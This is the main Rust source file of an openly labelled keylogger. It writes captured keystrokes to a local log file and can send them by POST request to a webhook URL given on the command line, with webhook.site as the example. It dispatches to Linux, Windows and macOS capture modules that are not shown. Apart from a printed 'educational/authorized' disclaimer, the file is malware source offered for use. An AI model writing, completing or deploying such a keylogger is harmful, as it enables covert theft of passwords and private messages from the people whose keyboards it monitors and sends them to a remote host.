use std::env;
use std::fs::OpenOptions;
use std::io::Write;
use chrono::Local;

fn print_usage() {
    eprintln!("Usage: rust-key [WEBHOOK_URL]");
    eprintln!("\nArguments:");
    eprintln!("  WEBHOOK_URL    Optional webhook URL to send keystrokes via POST request");
    eprintln!("\nExample:");
    eprintln!("  rust-key https://webhook.site/your-unique-id");
}

fn get_webhook_url() -> Option<String> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() > 2 {
        print_usage();
        eprintln!("\nError: Too many arguments provided");
        std::process::exit(1);
    }
    
    if args.len() == 2 {
        if args[1] == "--help" || args[1] == "-h" {
            print_usage();
            std::process::exit(0);
        }
        
        let url = args[1].clone();
        if !url.starts_with("http://") && !url.starts_with("https://") {
            eprintln!("Error: Webhook URL must start with http:// or https://");
            std::process::exit(1);
        }
        
        Some(url)
    } else {
        None
    }
}

#[cfg(all(target_os = "linux", feature = "linux-evdev"))]
mod linux;

#[cfg(target_os = "windows")]
mod windows;

#[cfg(target_os = "macos")]
mod macos;

const DEFAULT_LOCALE: &str = "en_US.UTF-8";

fn main() {
    // Set default locale to en_US.UTF-8
    env::set_var("LANG", DEFAULT_LOCALE);
    env::set_var("LC_ALL", DEFAULT_LOCALE);
    
    println!("Rust Keylogger starting...");
    println!("Default locale: {}", DEFAULT_LOCALE);
    println!("Note: This tool is for educational/authorized security testing only.");
    println!("Unauthorized use may be illegal.\n");

    // Get webhook URL from command line if provided
    let webhook_url = get_webhook_url();
    
    if let Some(ref url) = webhook_url {
        println!("Webhook URL configured: {}", url);
    } else {
        println!("No webhook URL provided. Keys will only be saved to file.");
    }

    // Create log file
    let log_path = "keylog.txt";
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path)
        .expect("Failed to open log file");

    writeln!(file, "\n=== Keylogger Started at {} ===", Local::now())
        .expect("Failed to write to log file");
    writeln!(file, "Locale: {}", DEFAULT_LOCALE)
        .expect("Failed to write to log file");
    if let Some(ref url) = webhook_url {
        writeln!(file, "Webhook URL: {}", url)
            .expect("Failed to write to log file");
    }

    #[cfg(all(target_os = "linux", feature = "linux-evdev"))]
    {
        println!("Running on Linux with evdev support");
        println!("Scanning for input devices (including USB keyboards)...\n");
        linux::run_keylogger(log_path, webhook_url);
    }

    #[cfg(target_os = "windows")]
    {
        println!("Running on Windows");
        windows::run_keylogger(log_path, webhook_url);
    }

    #[cfg(target_os = "macos")]
    {
        println!("Running on macOS");
        macos::run_keylogger(log_path, webhook_url);
    }

    #[cfg(not(any(
        all(target_os = "linux", feature = "linux-evdev"),
        target_os = "windows",
        target_os = "macos"
    )))]
    {
        eprintln!("Unsupported platform or features not enabled");
        eprintln!("For Linux: Enable 'linux-evdev' feature");
        std::process::exit(1);
    }
}
